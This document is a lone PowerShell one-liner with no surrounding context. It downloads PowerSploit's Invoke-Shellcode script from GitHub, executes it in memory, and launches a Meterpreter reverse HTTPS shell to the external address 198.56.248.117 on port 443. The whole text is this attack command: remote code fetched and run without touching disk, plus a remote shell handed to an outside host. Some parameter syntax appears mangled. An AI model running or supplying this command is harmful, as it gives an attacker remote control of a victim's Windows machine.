
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode  Payload windows/meterpreter/reverse_https  Lhost 198.56.248.117  Lport 443  Force

